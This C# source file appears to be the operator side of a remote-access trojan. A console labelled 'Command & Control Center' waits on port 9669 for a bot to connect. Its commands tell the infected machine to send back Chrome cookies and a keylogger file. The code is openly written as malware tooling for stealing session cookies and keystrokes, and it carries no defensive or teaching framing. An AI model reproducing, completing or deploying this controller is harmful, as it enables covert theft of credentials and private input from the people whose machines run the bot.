using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.Remoting.Channels;
using System.IO;
using System.Runtime.InteropServices.ComTypes;

namespace Server
{
    internal class Program
    {
        private const int BUFFER_SIZE = 1024;
        private const int PORT_NUMBER = 9669;
        static ASCIIEncoding encoding = new ASCIIEncoding();
        static void Main(string[] args)
        {
            try
            {

                IPAddress address = IPAddress.Parse("192.168.100.31");

                TcpListener listener = new TcpListener(address, PORT_NUMBER);

                // 1. listen
                listener.Start();

                Console.WriteLine("Server started on " + listener.LocalEndpoint);
                Console.WriteLine("Waiting for a connection...");


                TcpClient tcplient = listener.AcceptTcpClient();

                Console.WriteLine("Connection received from " + tcplient.Client.RemoteEndPoint);
                // Socket socket = listener.AcceptSocket();


                while (true)
                {
                    Console.WriteLine(" Command & Control Center");
                    Console.Write("Enter your command: ");
                    string command = Console.ReadLine();

                    // handleCommand(command,socket);
                    handleCommand(command, tcplient);
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex);
            }
        }
        public static void handleCommand(string command, TcpClient client)
        {
            Socket socket = client.Client;
            command = command.Trim().ToLower();
            if (command == "clear")
            {
                Console.Clear();

            }
            else if (command == "exit")
            {
                socket.Send(encoding.GetBytes("exit"));
                Console.WriteLine("Sending exit command...");

                byte[] data = new byte[BUFFER_SIZE];
                socket.Receive(data);
                Console.WriteLine("Client: " + encoding.GetString(data));
            }
            else if (command == "get cookies")
            {
                socket.Send(encoding.GetBytes("cookies"));
                Console.WriteLine("Sending request get cookies...");
            }
            else if (command == "get file keylogger")
            {
                socket.Send(encoding.GetBytes("keylogger"));
                Console.WriteLine("Sending request get keylogger...");
                byte[] buffer = new byte[1024];
                Stream stream = client.GetStream();
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                string message = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                Console.WriteLine("Client: " + message);
            }
            else if (command == "help")
            {
                Console.WriteLine("clear                               --> Clear The Screen");
                Console.WriteLine("get cookies                         --> Get Cookies Chrome From Bot");
                Console.WriteLine("get file keylogger                  --> Get File From Bot");
            }
        }
      
    }
}
